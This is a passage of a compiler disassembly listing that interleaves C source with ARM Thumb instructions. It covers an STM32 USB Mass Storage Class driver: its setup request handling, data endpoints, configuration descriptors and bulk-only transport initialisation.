 8008f50:	009b      	lsls	r3, r3, #2
 8008f52:	4413      	add	r3, r2
 8008f54:	685b      	ldr	r3, [r3, #4]
 8008f56:	699b      	ldr	r3, [r3, #24]
 8008f58:	4798      	blx	r3
 8008f5a:	4603      	mov	r3, r0
 8008f5c:	461a      	mov	r2, r3
 8008f5e:	693b      	ldr	r3, [r7, #16]
 8008f60:	601a      	str	r2, [r3, #0]
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->max_lun, 1U);
 8008f62:	693b      	ldr	r3, [r7, #16]
 8008f64:	2201      	movs	r2, #1
 8008f66:	4619      	mov	r1, r3
 8008f68:	6878      	ldr	r0, [r7, #4]
 8008f6a:	f003 f979 	bl	800c260 <USBD_CtlSendData>
 8008f6e:	bf00      	nop
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008f70:	e025      	b.n	8008fbe <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8008f72:	6839      	ldr	r1, [r7, #0]
 8008f74:	6878      	ldr	r0, [r7, #4]
 8008f76:	f003 f902 	bl	800c17e <USBD_CtlError>
            ret = USBD_FAIL;
 8008f7a:	2303      	movs	r3, #3
 8008f7c:	75fb      	strb	r3, [r7, #23]
          break;
 8008f7e:	e01e      	b.n	8008fbe <USBD_MSC_Setup+0xde>

        case BOT_RESET :
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008f80:	683b      	ldr	r3, [r7, #0]
 8008f82:	885b      	ldrh	r3, [r3, #2]
 8008f84:	2b00      	cmp	r3, #0
 8008f86:	d10c      	bne.n	8008fa2 <USBD_MSC_Setup+0xc2>
 8008f88:	683b      	ldr	r3, [r7, #0]
 8008f8a:	88db      	ldrh	r3, [r3, #6]
 8008f8c:	2b00      	cmp	r3, #0
 8008f8e:	d108      	bne.n	8008fa2 <USBD_MSC_Setup+0xc2>
              ((req->bmRequest & 0x80U) != 0x80U))
 8008f90:	683b      	ldr	r3, [r7, #0]
 8008f92:	781b      	ldrb	r3, [r3, #0]
 8008f94:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008f96:	2b00      	cmp	r3, #0
 8008f98:	db03      	blt.n	8008fa2 <USBD_MSC_Setup+0xc2>
          {
            MSC_BOT_Reset(pdev);
 8008f9a:	6878      	ldr	r0, [r7, #4]
 8008f9c:	f000 f9bc 	bl	8009318 <MSC_BOT_Reset>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008fa0:	e00d      	b.n	8008fbe <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8008fa2:	6839      	ldr	r1, [r7, #0]
 8008fa4:	6878      	ldr	r0, [r7, #4]
 8008fa6:	f003 f8ea 	bl	800c17e <USBD_CtlError>
            ret = USBD_FAIL;
 8008faa:	2303      	movs	r3, #3
 8008fac:	75fb      	strb	r3, [r7, #23]
          break;
 8008fae:	e006      	b.n	8008fbe <USBD_MSC_Setup+0xde>

        default:
          USBD_CtlError(pdev, req);
 8008fb0:	6839      	ldr	r1, [r7, #0]
 8008fb2:	6878      	ldr	r0, [r7, #4]
 8008fb4:	f003 f8e3 	bl	800c17e <USBD_CtlError>
          ret = USBD_FAIL;
 8008fb8:	2303      	movs	r3, #3
 8008fba:	75fb      	strb	r3, [r7, #23]
          break;
 8008fbc:	bf00      	nop
      }
      break;
 8008fbe:	e086      	b.n	80090ce <USBD_MSC_Setup+0x1ee>
    /* Interface & Endpoint request */
    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8008fc0:	683b      	ldr	r3, [r7, #0]
 8008fc2:	785b      	ldrb	r3, [r3, #1]
 8008fc4:	2b0b      	cmp	r3, #11
 8008fc6:	d872      	bhi.n	80090ae <USBD_MSC_Setup+0x1ce>
 8008fc8:	a201      	add	r2, pc, #4	; (adr r2, 8008fd0 <USBD_MSC_Setup+0xf0>)
 8008fca:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008fce:	bf00      	nop
 8008fd0:	08009001 	.word	0x08009001
 8008fd4:	0800907d 	.word	0x0800907d
 8008fd8:	080090af 	.word	0x080090af
 8008fdc:	080090af 	.word	0x080090af
 8008fe0:	080090af 	.word	0x080090af
 8008fe4:	080090af 	.word	0x080090af
 8008fe8:	080090af 	.word	0x080090af
 8008fec:	080090af 	.word	0x080090af
 8008ff0:	080090af 	.word	0x080090af
 8008ff4:	080090af 	.word	0x080090af
 8008ff8:	0800902b 	.word	0x0800902b
 8008ffc:	08009055 	.word	0x08009055
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009000:	687b      	ldr	r3, [r7, #4]
 8009002:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009006:	b2db      	uxtb	r3, r3
 8009008:	2b03      	cmp	r3, #3
 800900a:	d107      	bne.n	800901c <USBD_MSC_Setup+0x13c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 800900c:	f107 030e 	add.w	r3, r7, #14
 8009010:	2202      	movs	r2, #2
 8009012:	4619      	mov	r1, r3
 8009014:	6878      	ldr	r0, [r7, #4]
 8009016:	f003 f923 	bl	800c260 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 800901a:	e050      	b.n	80090be <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 800901c:	6839      	ldr	r1, [r7, #0]
 800901e:	6878      	ldr	r0, [r7, #4]
 8009020:	f003 f8ad 	bl	800c17e <USBD_CtlError>
            ret = USBD_FAIL;
 8009024:	2303      	movs	r3, #3
 8009026:	75fb      	strb	r3, [r7, #23]
          break;
 8009028:	e049      	b.n	80090be <USBD_MSC_Setup+0x1de>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800902a:	687b      	ldr	r3, [r7, #4]
 800902c:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009030:	b2db      	uxtb	r3, r3
 8009032:	2b03      	cmp	r3, #3
 8009034:	d107      	bne.n	8009046 <USBD_MSC_Setup+0x166>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->interface, 1U);
 8009036:	693b      	ldr	r3, [r7, #16]
 8009038:	3304      	adds	r3, #4
 800903a:	2201      	movs	r2, #1
 800903c:	4619      	mov	r1, r3
 800903e:	6878      	ldr	r0, [r7, #4]
 8009040:	f003 f90e 	bl	800c260 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009044:	e03b      	b.n	80090be <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8009046:	6839      	ldr	r1, [r7, #0]
 8009048:	6878      	ldr	r0, [r7, #4]
 800904a:	f003 f898 	bl	800c17e <USBD_CtlError>
            ret = USBD_FAIL;
 800904e:	2303      	movs	r3, #3
 8009050:	75fb      	strb	r3, [r7, #23]
          break;
 8009052:	e034      	b.n	80090be <USBD_MSC_Setup+0x1de>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009054:	687b      	ldr	r3, [r7, #4]
 8009056:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800905a:	b2db      	uxtb	r3, r3
 800905c:	2b03      	cmp	r3, #3
 800905e:	d106      	bne.n	800906e <USBD_MSC_Setup+0x18e>
          {
            hmsc->interface = (uint8_t)(req->wValue);
 8009060:	683b      	ldr	r3, [r7, #0]
 8009062:	885b      	ldrh	r3, [r3, #2]
 8009064:	b2db      	uxtb	r3, r3
 8009066:	461a      	mov	r2, r3
 8009068:	693b      	ldr	r3, [r7, #16]
 800906a:	605a      	str	r2, [r3, #4]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 800906c:	e027      	b.n	80090be <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 800906e:	6839      	ldr	r1, [r7, #0]
 8009070:	6878      	ldr	r0, [r7, #4]
 8009072:	f003 f884 	bl	800c17e <USBD_CtlError>
            ret = USBD_FAIL;
 8009076:	2303      	movs	r3, #3
 8009078:	75fb      	strb	r3, [r7, #23]
          break;
 800907a:	e020      	b.n	80090be <USBD_MSC_Setup+0x1de>

        case USB_REQ_CLEAR_FEATURE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800907c:	687b      	ldr	r3, [r7, #4]
 800907e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009082:	b2db      	uxtb	r3, r3
 8009084:	2b03      	cmp	r3, #3
 8009086:	d119      	bne.n	80090bc <USBD_MSC_Setup+0x1dc>
          {
            if (req->wValue == USB_FEATURE_EP_HALT)
 8009088:	683b      	ldr	r3, [r7, #0]
 800908a:	885b      	ldrh	r3, [r3, #2]
 800908c:	2b00      	cmp	r3, #0
 800908e:	d115      	bne.n	80090bc <USBD_MSC_Setup+0x1dc>
            {
              /* Flush the FIFO */
              (void)USBD_LL_FlushEP(pdev, (uint8_t)req->wIndex);
 8009090:	683b      	ldr	r3, [r7, #0]
 8009092:	889b      	ldrh	r3, [r3, #4]
 8009094:	b2db      	uxtb	r3, r3
 8009096:	4619      	mov	r1, r3
 8009098:	6878      	ldr	r0, [r7, #4]
 800909a:	f003 fdad 	bl	800cbf8 <USBD_LL_FlushEP>

              /* Handle BOT error */
              MSC_BOT_CplClrFeature(pdev, (uint8_t)req->wIndex);
 800909e:	683b      	ldr	r3, [r7, #0]
 80090a0:	889b      	ldrh	r3, [r3, #4]
 80090a2:	b2db      	uxtb	r3, r3
 80090a4:	4619      	mov	r1, r3
 80090a6:	6878      	ldr	r0, [r7, #4]
 80090a8:	f000 fb54 	bl	8009754 <MSC_BOT_CplClrFeature>
            }
          }
          break;
 80090ac:	e006      	b.n	80090bc <USBD_MSC_Setup+0x1dc>

        default:
          USBD_CtlError(pdev, req);
 80090ae:	6839      	ldr	r1, [r7, #0]
 80090b0:	6878      	ldr	r0, [r7, #4]
 80090b2:	f003 f864 	bl	800c17e <USBD_CtlError>
          ret = USBD_FAIL;
 80090b6:	2303      	movs	r3, #3
 80090b8:	75fb      	strb	r3, [r7, #23]
          break;
 80090ba:	e000      	b.n	80090be <USBD_MSC_Setup+0x1de>
          break;
 80090bc:	bf00      	nop
      }
      break;
 80090be:	e006      	b.n	80090ce <USBD_MSC_Setup+0x1ee>

    default:
      USBD_CtlError(pdev, req);
 80090c0:	6839      	ldr	r1, [r7, #0]
 80090c2:	6878      	ldr	r0, [r7, #4]
 80090c4:	f003 f85b 	bl	800c17e <USBD_CtlError>
      ret = USBD_FAIL;
 80090c8:	2303      	movs	r3, #3
 80090ca:	75fb      	strb	r3, [r7, #23]
      break;
 80090cc:	bf00      	nop
  }

  return (uint8_t)ret;
 80090ce:	7dfb      	ldrb	r3, [r7, #23]
}
 80090d0:	4618      	mov	r0, r3
 80090d2:	3718      	adds	r7, #24
 80090d4:	46bd      	mov	sp, r7
 80090d6:	bd80      	pop	{r7, pc}

080090d8 <USBD_MSC_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80090d8:	b580      	push	{r7, lr}
 80090da:	b082      	sub	sp, #8
 80090dc:	af00      	add	r7, sp, #0
 80090de:	6078      	str	r0, [r7, #4]
 80090e0:	460b      	mov	r3, r1
 80090e2:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataIn(pdev, epnum);
 80090e4:	78fb      	ldrb	r3, [r7, #3]
 80090e6:	4619      	mov	r1, r3
 80090e8:	6878      	ldr	r0, [r7, #4]
 80090ea:	f000 f961 	bl	80093b0 <MSC_BOT_DataIn>

  return (uint8_t)USBD_OK;
 80090ee:	2300      	movs	r3, #0
}
 80090f0:	4618      	mov	r0, r3
 80090f2:	3708      	adds	r7, #8
 80090f4:	46bd      	mov	sp, r7
 80090f6:	bd80      	pop	{r7, pc}

080090f8 <USBD_MSC_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80090f8:	b580      	push	{r7, lr}
 80090fa:	b082      	sub	sp, #8
 80090fc:	af00      	add	r7, sp, #0
 80090fe:	6078      	str	r0, [r7, #4]
 8009100:	460b      	mov	r3, r1
 8009102:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataOut(pdev, epnum);
 8009104:	78fb      	ldrb	r3, [r7, #3]
 8009106:	4619      	mov	r1, r3
 8009108:	6878      	ldr	r0, [r7, #4]
 800910a:	f000 f98d 	bl	8009428 <MSC_BOT_DataOut>

  return (uint8_t)USBD_OK;
 800910e:	2300      	movs	r3, #0
}
 8009110:	4618      	mov	r0, r3
 8009112:	3708      	adds	r7, #8
 8009114:	46bd      	mov	sp, r7
 8009116:	bd80      	pop	{r7, pc}

08009118 <USBD_MSC_GetHSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetHSCfgDesc(uint16_t *length)
{
 8009118:	b580      	push	{r7, lr}
 800911a:	b084      	sub	sp, #16
 800911c:	af00      	add	r7, sp, #0
 800911e:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009120:	2181      	movs	r1, #129	; 0x81
 8009122:	4812      	ldr	r0, [pc, #72]	; (800916c <USBD_MSC_GetHSCfgDesc+0x54>)
 8009124:	f002 f9c8 	bl	800b4b8 <USBD_GetEpDesc>
 8009128:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800912a:	2101      	movs	r1, #1
 800912c:	480f      	ldr	r0, [pc, #60]	; (800916c <USBD_MSC_GetHSCfgDesc+0x54>)
 800912e:	f002 f9c3 	bl	800b4b8 <USBD_GetEpDesc>
 8009132:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009134:	68fb      	ldr	r3, [r7, #12]
 8009136:	2b00      	cmp	r3, #0
 8009138:	d006      	beq.n	8009148 <USBD_MSC_GetHSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 800913a:	68fb      	ldr	r3, [r7, #12]
 800913c:	2200      	movs	r2, #0
 800913e:	711a      	strb	r2, [r3, #4]
 8009140:	2200      	movs	r2, #0
 8009142:	f042 0202 	orr.w	r2, r2, #2
 8009146:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009148:	68bb      	ldr	r3, [r7, #8]
 800914a:	2b00      	cmp	r3, #0
 800914c:	d006      	beq.n	800915c <USBD_MSC_GetHSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 800914e:	68bb      	ldr	r3, [r7, #8]
 8009150:	2200      	movs	r2, #0
 8009152:	711a      	strb	r2, [r3, #4]
 8009154:	2200      	movs	r2, #0
 8009156:	f042 0202 	orr.w	r2, r2, #2
 800915a:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 800915c:	687b      	ldr	r3, [r7, #4]
 800915e:	2220      	movs	r2, #32
 8009160:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 8009162:	4b02      	ldr	r3, [pc, #8]	; (800916c <USBD_MSC_GetHSCfgDesc+0x54>)
}
 8009164:	4618      	mov	r0, r3
 8009166:	3710      	adds	r7, #16
 8009168:	46bd      	mov	sp, r7
 800916a:	bd80      	pop	{r7, pc}
 800916c:	200000e0 	.word	0x200000e0

08009170 <USBD_MSC_GetFSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetFSCfgDesc(uint16_t *length)
{
 8009170:	b580      	push	{r7, lr}
 8009172:	b084      	sub	sp, #16
 8009174:	af00      	add	r7, sp, #0
 8009176:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009178:	2181      	movs	r1, #129	; 0x81
 800917a:	4812      	ldr	r0, [pc, #72]	; (80091c4 <USBD_MSC_GetFSCfgDesc+0x54>)
 800917c:	f002 f99c 	bl	800b4b8 <USBD_GetEpDesc>
 8009180:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 8009182:	2101      	movs	r1, #1
 8009184:	480f      	ldr	r0, [pc, #60]	; (80091c4 <USBD_MSC_GetFSCfgDesc+0x54>)
 8009186:	f002 f997 	bl	800b4b8 <USBD_GetEpDesc>
 800918a:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 800918c:	68fb      	ldr	r3, [r7, #12]
 800918e:	2b00      	cmp	r3, #0
 8009190:	d006      	beq.n	80091a0 <USBD_MSC_GetFSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 8009192:	68fb      	ldr	r3, [r7, #12]
 8009194:	2200      	movs	r2, #0
 8009196:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 800919a:	711a      	strb	r2, [r3, #4]
 800919c:	2200      	movs	r2, #0
 800919e:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80091a0:	68bb      	ldr	r3, [r7, #8]
 80091a2:	2b00      	cmp	r3, #0
 80091a4:	d006      	beq.n	80091b4 <USBD_MSC_GetFSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80091a6:	68bb      	ldr	r3, [r7, #8]
 80091a8:	2200      	movs	r2, #0
 80091aa:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80091ae:	711a      	strb	r2, [r3, #4]
 80091b0:	2200      	movs	r2, #0
 80091b2:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 80091b4:	687b      	ldr	r3, [r7, #4]
 80091b6:	2220      	movs	r2, #32
 80091b8:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 80091ba:	4b02      	ldr	r3, [pc, #8]	; (80091c4 <USBD_MSC_GetFSCfgDesc+0x54>)
}
 80091bc:	4618      	mov	r0, r3
 80091be:	3710      	adds	r7, #16
 80091c0:	46bd      	mov	sp, r7
 80091c2:	bd80      	pop	{r7, pc}
 80091c4:	200000e0 	.word	0x200000e0

080091c8 <USBD_MSC_GetOtherSpeedCfgDesc>:
  *         return other speed configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetOtherSpeedCfgDesc(uint16_t *length)
{
 80091c8:	b580      	push	{r7, lr}
 80091ca:	b084      	sub	sp, #16
 80091cc:	af00      	add	r7, sp, #0
 80091ce:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80091d0:	2181      	movs	r1, #129	; 0x81
 80091d2:	4812      	ldr	r0, [pc, #72]	; (800921c <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 80091d4:	f002 f970 	bl	800b4b8 <USBD_GetEpDesc>
 80091d8:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 80091da:	2101      	movs	r1, #1
 80091dc:	480f      	ldr	r0, [pc, #60]	; (800921c <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 80091de:	f002 f96b 	bl	800b4b8 <USBD_GetEpDesc>
 80091e2:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80091e4:	68fb      	ldr	r3, [r7, #12]
 80091e6:	2b00      	cmp	r3, #0
 80091e8:	d006      	beq.n	80091f8 <USBD_MSC_GetOtherSpeedCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80091ea:	68fb      	ldr	r3, [r7, #12]
 80091ec:	2200      	movs	r2, #0
 80091ee:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80091f2:	711a      	strb	r2, [r3, #4]
 80091f4:	2200      	movs	r2, #0
 80091f6:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80091f8:	68bb      	ldr	r3, [r7, #8]
 80091fa:	2b00      	cmp	r3, #0
 80091fc:	d006      	beq.n	800920c <USBD_MSC_GetOtherSpeedCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80091fe:	68bb      	ldr	r3, [r7, #8]
 8009200:	2200      	movs	r2, #0
 8009202:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009206:	711a      	strb	r2, [r3, #4]
 8009208:	2200      	movs	r2, #0
 800920a:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 800920c:	687b      	ldr	r3, [r7, #4]
 800920e:	2220      	movs	r2, #32
 8009210:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 8009212:	4b02      	ldr	r3, [pc, #8]	; (800921c <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
}
 8009214:	4618      	mov	r0, r3
 8009216:	3710      	adds	r7, #16
 8009218:	46bd      	mov	sp, r7
 800921a:	bd80      	pop	{r7, pc}
 800921c:	200000e0 	.word	0x200000e0

08009220 <USBD_MSC_GetDeviceQualifierDescriptor>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetDeviceQualifierDescriptor(uint16_t *length)
{
 8009220:	b480      	push	{r7}
 8009222:	b083      	sub	sp, #12
 8009224:	af00      	add	r7, sp, #0
 8009226:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_MSC_DeviceQualifierDesc);
 8009228:	687b      	ldr	r3, [r7, #4]
 800922a:	220a      	movs	r2, #10
 800922c:	801a      	strh	r2, [r3, #0]

  return USBD_MSC_DeviceQualifierDesc;
 800922e:	4b03      	ldr	r3, [pc, #12]	; (800923c <USBD_MSC_GetDeviceQualifierDescriptor+0x1c>)
}
 8009230:	4618      	mov	r0, r3
 8009232:	370c      	adds	r7, #12
 8009234:	46bd      	mov	sp, r7
 8009236:	f85d 7b04 	ldr.w	r7, [sp], #4
 800923a:	4770      	bx	lr
 800923c:	20000100 	.word	0x20000100

08009240 <USBD_MSC_RegisterStorage>:
  * @brief  USBD_MSC_RegisterStorage
  * @param  fops: storage callback
  * @retval status
  */
uint8_t USBD_MSC_RegisterStorage(USBD_HandleTypeDef *pdev, USBD_StorageTypeDef *fops)
{
 8009240:	b480      	push	{r7}
 8009242:	b083      	sub	sp, #12
 8009244:	af00      	add	r7, sp, #0
 8009246:	6078      	str	r0, [r7, #4]
 8009248:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 800924a:	683b      	ldr	r3, [r7, #0]
 800924c:	2b00      	cmp	r3, #0
 800924e:	d101      	bne.n	8009254 <USBD_MSC_RegisterStorage+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8009250:	2303      	movs	r3, #3
 8009252:	e009      	b.n	8009268 <USBD_MSC_RegisterStorage+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8009254:	687b      	ldr	r3, [r7, #4]
 8009256:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800925a:	687a      	ldr	r2, [r7, #4]
 800925c:	33b0      	adds	r3, #176	; 0xb0
 800925e:	009b      	lsls	r3, r3, #2
 8009260:	4413      	add	r3, r2
 8009262:	683a      	ldr	r2, [r7, #0]
 8009264:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8009266:	2300      	movs	r3, #0
}
 8009268:	4618      	mov	r0, r3
 800926a:	370c      	adds	r7, #12
 800926c:	46bd      	mov	sp, r7
 800926e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009272:	4770      	bx	lr

08009274 <MSC_BOT_Init>:
  *         Initialize the BOT Process
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_Init(USBD_HandleTypeDef *pdev)
{
 8009274:	b580      	push	{r7, lr}
 8009276:	b084      	sub	sp, #16
 8009278:	af00      	add	r7, sp, #0
 800927a:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800927c:	687b      	ldr	r3, [r7, #4]
 800927e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009282:	687b      	ldr	r3, [r7, #4]
 8009284:	32b0      	adds	r2, #176	; 0xb0
 8009286:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800928a:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 800928c:	68fb      	ldr	r3, [r7, #12]
 800928e:	2b00      	cmp	r3, #0
 8009290:	d039      	beq.n	8009306 <MSC_BOT_Init+0x92>
  {
    return;
  }

  hmsc->bot_state = USBD_BOT_IDLE;
 8009292:	68fb      	ldr	r3, [r7, #12]
 8009294:	2200      	movs	r2, #0
 8009296:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_NORMAL;
 8009298:	68fb      	ldr	r3, [r7, #12]
 800929a:	2200      	movs	r2, #0
 800929c:	725a      	strb	r2, [r3, #9]

  hmsc->scsi_sense_tail = 0U;
 800929e:	68fb      	ldr	r3, [r7, #12]
 80092a0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80092a4:	2200      	movs	r2, #0
 80092a6:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
  hmsc->scsi_sense_head = 0U;
 80092aa:	68fb      	ldr	r3, [r7, #12]
 80092ac:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80092b0:	2200      	movs	r2, #0
 80092b2:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
  hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 80092b6:	68fb      	ldr	r3, [r7, #12]
 80092b8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80092bc:	2200      	movs	r2, #0
 80092be:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62

  ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Init(0U);
 80092c2:	687b      	ldr	r3, [r7, #4]
 80092c4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80092c8:	687a      	ldr	r2, [r7, #4]
 80092ca:	33b0      	adds	r3, #176	; 0xb0
 80092cc:	009b      	lsls	r3, r3, #2
 80092ce:	4413      	add	r3, r2
 80092d0:	685b      	ldr	r3, [r3, #4]
 80092d2:	681b      	ldr	r3, [r3, #0]
 80092d4:	2000      	movs	r0, #0
 80092d6:	4798      	blx	r3

  (void)USBD_LL_FlushEP(pdev, MSCOutEpAdd);
 80092d8:	4b0d      	ldr	r3, [pc, #52]	; (8009310 <MSC_BOT_Init+0x9c>)
 80092da:	781b      	ldrb	r3, [r3, #0]
 80092dc:	4619      	mov	r1, r3
 80092de:	6878      	ldr	r0, [r7, #4]
 80092e0:	f003 fc8a 	bl	800cbf8 <USBD_LL_FlushEP>
  (void)USBD_LL_FlushEP(pdev, MSCInEpAdd);
 80092e4:	4b0b      	ldr	r3, [pc, #44]	; (8009314 <MSC_BOT_Init+0xa0>)
 80092e6:	781b      	ldrb	r3, [r3, #0]
 80092e8:	4619      	mov	r1, r3
 80092ea:	6878      	ldr	r0, [r7, #4]
 80092ec:	f003 fc84 	bl	800cbf8 <USBD_LL_FlushEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80092f0:	4b07      	ldr	r3, [pc, #28]	; (8009310 <MSC_BOT_Init+0x9c>)
 80092f2:	7819      	ldrb	r1, [r3, #0]
 80092f4:	68fb      	ldr	r3, [r7, #12]
 80092f6:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80092fa:	3210      	adds	r2, #16
 80092fc:	231f      	movs	r3, #31
 80092fe:	6878      	ldr	r0, [r7, #4]
 8009300:	f003 fdb8 	bl	800ce74 <USBD_LL_PrepareReceive>
 8009304:	e000      	b.n	8009308 <MSC_BOT_Init+0x94>
    return;
 8009306:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 8009308:	3710      	adds	r7, #16
 800930a:	46bd      	mov	sp, r7
 800930c:	bd80      	pop	{r7, pc}
 800930e:	bf00      	nop
 8009310:	2000010b 	.word	0x2000010b
 8009314:	2000010a 	.word	0x2000010a

08009318 <MSC_BOT_Reset>:
  *         Reset the BOT Machine
  * @param  pdev: device instance
  * @retval  None
  */
